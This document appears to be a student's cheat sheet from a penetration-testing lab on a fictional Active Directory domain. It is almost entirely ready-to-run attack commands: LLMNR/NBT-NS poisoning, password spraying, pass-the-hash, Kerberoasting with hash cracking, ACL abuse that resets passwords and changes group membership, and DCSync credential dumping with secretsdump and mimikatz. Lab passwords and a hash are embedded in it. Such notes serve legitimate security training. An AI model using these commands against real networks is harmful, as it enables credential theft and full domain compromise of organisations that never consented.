# Active Directory

### Recon

```shell
  viewdns.info
  nslookup ns1.inlanefreight.com
  linkedin2username
  filetype:pdf inurl:inlanefreight.com
  intext:"@inlanefreight.com" inurl:inlanefreight.com
  sudo python3 dehashed.py -q inlanefreight.local -p
```

---

### Initial Enumeration

```shell
  sudo -E wireshark
  sudo tcpdump -i ens224
  sudo responder -I ens224 -A
  fping -asgq 172.16.5.0/23
  sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
  nmap -A 172.16.5.100
  sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
  
  sudo git clone https://github.com/ropnop/kerbrute.git
  sudo make all
```

```shell
  #kerbrute
  
  ./kerbrute_linux_amd64
  cho $PATH
  /home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools
  sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
  kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

---

### LLMNR/NBT-NS Poisoning

```shell
  # From linux capture the ntlmv2 hash
  responder -h
  sudo responder -I ens224 
  hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt

  # From windows capture the ntlmv2 hash
  Import-Module .\Inveigh.ps1
  (Get-Command Invoke-Inveigh).Parameters

  Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
  .\Inveigh.exe

  $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
  Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

---

### Sighting In, Hunting For a User

```shell
  # From Linux
  crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

  rpcclient -U "" -N 172.16.5.5
  querydominfo

  enum4linux -P 172.16.5.5
  enum4linux-ng -P 172.16.5.5 -oA ilfreight
  ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

  # From windows
  net use \\DC01\ipc$ "" /u:""
  net use \\DC01\ipc$ "" /u:guest
  #1331 error = account disabled, 1326 username or password is incorrect, 1909 Account is llocked out via password policy
  net accounts

  import-module .\PowerView.ps1
  Get-DomainPolicy
```

---

### Username Enumeration

```shell
  enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
  rpcclient -U "" -N 172.16.5.5
  crackmapexec smb 172.16.5.5 --users
  ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
  ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

  # only  username not full email
  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | awk '/VALID USERNAME/ {print $7}' | cut -d '@' -f 1 > valid_users.txt
  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | awk '/VALID USERNAME/ {print $7}' > valid_users.txt
  sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
  
```

### Password Spraying 

```shell
  # Linux
  for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
  kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
  sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
  sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

  sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

  # Windows
  Import-Module .\DomainPasswordSpray.ps1
  Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```
---

### Deeper Down / Living Off the Land

```shell
  Get-MpComputerStatus
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  $ExecutionContext.SessionState.LanguageMode
  Find-LAPSDelegatedGroups
  Find-AdmPwdExtendedRights
  Get-LAPSComputers

  Get-Module
  Get-ChildItem Env: | ft key,value
  Get-host
  powershell.exe -version 2
  netsh advfirewall show allprofiles
  sc query windefend
  Get-MpComputerStatus
  qwinsta # Am i the only one logged in?
  arp -a
  route print
  wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

  net group /domain
  net user /domain wrouse
  net localgroup Administrators

  dsquery user
  dsquery computer
  dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
  dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
  dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName description
  dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
```

---

### Credentialed Enumeration 

Linux

```shell
  sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
  sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
  sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
  sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
  sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
  head -n 10 /tmp/cme_spider_plus/172.16.5.5.json

  smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
  smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
  rpcclient -U "" -N 172.16.5.5
  #When connected via rpcclient
  queryuser 0x457
  enumdomusers

  psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
  wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
  python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
  python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

  sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

Windows

```shell
  Get-Module
  Import-Module ActiveDirectory
  Get-Module
  Get-ADDomain
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

  Get-ADTrust -Filter *
  Get-ADGroup -Filter * | select name
  Get-ADGroup -Identity "Backup Operators"
  Get-ADGroupMember -Identity "Backup Operators"
  Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
  Get-DomainTrustMapping
  Test-AdminAccess -ComputerName ACADEMY-EA-MS01
  Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

  .\SharpView.exe Get-DomainUser -Help
  .\SharpView.exe Get-DomainUser -Identity forend
  Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v -data
  Snaffler.exe -s -d inlanefreight.local -v -data

  .\SharpHound.exe -c All --zipfilename ILFREIGHT
  cd .\BloodHound-GUI\
  .\BloodHound.exe
```

---

### Kerberoasting

Linux

```shell
  wget -q https://github.com/fortra/impacket
  pip install impacket

  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
  hashcat -m 13100 -w 3 -O sqldev_tgs /usr/share/wordlists/rockyou.txt --force
  sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

Windows

```shell
  setspn.exe -Q */*
  setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1
  Add-Type -AssemblyName System.IdentityModel
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
  setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

  #Mimikatz
  base64 /out:true
  kerberos::list /export

  echo "<base64 blob>" |  tr -d \\n
  cat encoded_file | base64 -d > sqldev.kirbi
  python2.7 kirbi2john.py sqldev.kirbi
  sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
  cat sqldev_tgs_hashcat
  hashcat -m 13100 -w 3 -O sqldev_tgs /usr/share/wordlists/rockyou.txt --force

  Import-Module .\PowerView.ps1
  Get-DomainUser * -spn | select samaccountname
  Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
  cat .\ilfreight_tgs.csv

  .\Rubeus.exe
  .\Rubeus.exe kerberoast /stats
  .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
  .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
  Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
  hashcat -m 13100 -w 3 -O sqldev_tgs /usr/share/wordlists/rockyou.txt --force
```

---

### Access Control (ACL)

```shhell
  Find-InterestingDomainAcl
  Import-Module .\PowerView.ps1
  $sid = Convert-NameToSid wley
  Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

  $guid= "00299570-246d-11d0-a768-00aa006e0529"
  Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
  Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
  foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

  $sid2 = Convert-NameToSid damundsen
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
  Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

  $itgroupsid = Convert-NameToSid "Information Technology"
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

  $adunnsid = Convert-NameToSid adunn 
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

```shell
  $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
  $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

  Import-Module .\PowerView.ps1
  Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

  $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
  $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

  Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

  Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
  Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

  Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

  .\Rubeus.exe kerberoast /user:adunn /nowrap
  Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
  Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
  Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
  
  ConvertFrom-SddlString "<sddL_String>" 
```

---

### DSYNC

```shell
  Import-Module .\PowerView.ps1
  Get-DomainUser -Identity syncron  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

  runas /netonly /user:INLANEFREIGHT\adunn powershell

  $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
  Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

  secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
  ls inlanefreight_hashes*

  Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

  cat inlanefreight_hashes.ntds.cleartext
  .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
  
```

---

### Privileged Access

```shell
  
```
